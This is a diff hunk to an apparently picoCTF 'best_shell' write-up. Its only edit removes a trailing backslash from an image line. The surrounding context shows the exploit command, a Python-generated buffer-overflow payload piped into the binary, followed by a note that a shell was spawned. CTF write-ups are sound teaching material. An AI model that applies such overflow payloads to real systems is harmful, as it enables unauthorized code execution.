@@ -86,7 +86,7 @@ We then run the following command to exploit the vulnerable binary:
 ```console
 $ (python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + '\n' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + ' test\n')";cat) | ./best_shell
 ```
-![shell spawn]({{ "/assets/img/posts/picoctf-best-shell-challenge/13.png" | relative_url }})\
+![shell spawn]({{ "/assets/img/posts/picoctf-best-shell-challenge/13.png" | relative_url }})
 Excellent, we successfully spawned a shell.
 
 
